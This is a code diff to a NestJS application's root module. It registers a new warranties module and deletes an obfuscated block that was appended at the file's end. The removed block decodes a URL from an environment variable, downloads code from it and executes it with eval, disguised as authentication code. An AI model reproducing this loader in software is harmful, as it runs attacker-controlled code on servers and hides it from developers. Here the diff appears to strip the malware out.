@@ -17,6 +17,7 @@ import { ChallansModule } from './challans/challans.module';
 import { ExpensesController } from './expenses/expenses.controller';
 import { ReportsController } from './reports/reports.controller';
 import { ReportsService } from './reports/reports.service';
+import { WarrantiesModule } from './warranties/warranties.module';
 @Module({
   imports: [
     ConfigModule.forRoot({
@@ -46,6 +47,7 @@ import { ReportsService } from './reports/reports.service';
     ThrottlerModule.forRoot([{ ttl: 60000, limit: 180 }]),
     AuthModule,
     ChallansModule,
+    WarrantiesModule,
   ],
   controllers: [
     ProductsController,
@@ -64,16 +66,3 @@ import { ReportsService } from './reports/reports.service';
   ],
 })
 export class AppModule {}
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
